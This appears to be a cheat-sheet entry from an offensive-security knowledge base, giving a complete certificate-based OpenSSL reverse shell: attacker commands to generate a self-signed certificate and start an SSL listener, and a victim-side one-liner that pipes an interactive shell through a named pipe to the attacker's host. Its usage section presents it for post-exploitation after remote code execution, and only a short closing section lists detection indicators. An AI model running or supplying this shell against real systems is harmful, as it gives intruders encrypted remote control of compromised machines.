---
type: code
language: bash
verified: true
platforms:
  - Linux
tags:
  - openssl
  - reverse-shell
  - certificate
validated: true
---

# openssl-certificate-based-reverse-shell

## Code

```bash
user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
or
user@attack$ ncat --ssl -vv -l -p 4242

user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
```

## Description

This bash snippet sets up a certificate-based OpenSSL reverse shell: generates a self-signed cert on the attacker, starts an SSL server listener (or Ncat alternative), and provides the victim-side command to connect back with a piped interactive shell using a FIFO for bidirectional communication.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 4242 | Port for listener and connection | 4242 |
| 10.0.0.1 | Attacker IP (in victim command) | 10.0.0.1 |
| key.pem, cert.pem | Generated key and cert files | key.pem, cert.pem |
| /tmp/s | Named pipe on victim | /tmp/s |

## Usage

Run attacker commands first to generate cert and start listener. Then execute victim command on compromised host to initiate reverse connection. Ideal for post-exploitation after initial RCE; provides encrypted shell without additional tools.

## Detection

- Monitor for openssl s_server or ncat --ssl processes on non-standard ports.
- Endpoint logs showing mkfifo /tmp/s or openssl s_client piping to sh.
- Network TLS traffic with self-signed certs or unusual cipher suites to internal IPs.
- Anomalous outbound connections from servers to attacker-controlled hosts.

## Related

- [[procedures/openssl-reverse-shell]]
- [[tools/openssl]]
